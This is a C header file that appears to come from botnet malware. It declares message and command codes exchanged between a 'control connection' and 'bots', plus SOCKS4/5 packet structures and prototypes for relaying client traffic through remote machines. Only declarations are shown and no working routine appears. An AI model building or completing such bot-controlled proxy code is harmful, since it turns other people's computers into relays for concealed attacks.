
/* msg recieved by control connection, sent by bots */
enum { MSG_INFO = 0xA4, MSG_READY, MSG_ERROR, MSG_BUSY, MSG_RESET, MSG_PONG, MSG_SOCKET };
/* mbscs commands sent by control connection to bots */
enum { CMD_SYN = 0xE1, CMD_PING, CMD_BYE };
/* error messages */
enum { ERR_SYN_TIMEOUT = 0x04, ERR_NO_ROUTE, ERR_RESOURCES, ERR_AGAIN };

struct pcrData
{
	SOCKET client_socket;
	int port;
};

struct ConnectRemoteMachineData
{
	SOCKET sock;
	struct sockaddr sin;
};

struct cmd_syn_data
{
	u_char version;
	char hostname[64];
	int port;
	struct sockaddr_in sin;

	char bhostname[64];
	int bport;
	struct sockaddr_in sout;

	int unused1;
	int unused2;
	int unused3;
	int unused4;
};

struct socket_info
{
	u_char version;
	char hostname[64];
	int port;

	int unused1;
	int unused2;
};

#pragma pack(1)
struct msg_info
{
	u_char version;
	struct sockaddr_in host;

	int unused1;
	int unused2;
	int unused3;
	int unused4;
};
#pragma pack()

/* socks 5 request and reply packets */
struct s5_packet {
	char ver;
	char cmd;
	char rsv;
	char atyp;
	struct in_addr  sin_addr;
	WORD d_port;
} ;

struct s5_reply {
	char ver;
	char rep;
	char rsv;
	char atyp;
	struct in_addr  local_addr;
	WORD local_port;
} ;

/* socks 4 request and reply packets */
struct s4_packet {
	char ver;
	char cd;
	WORD d_port;
	struct in_addr sin_addr;
	char userid[10];
} ;

struct s4_reply {
	char vn;
	char cd;
	WORD d_port;
	struct in_addr sin_addr;
} ;

void OpenControlLink(void);
DWORD WINAPI ConnectRemoteMachine( LPVOID ConnectRemoteMachineData );
char* MakeCmdPacket(int cmd, char* host, int port, int bport, int *packet_size);
DWORD WINAPI pcr(LPVOID pcrData);
void SendErrorToClient(SOCKET cli_socket, int s_version, int ver, int rep);
int socks_get_info(SOCKET cli_socket, char *rhost, int *rport);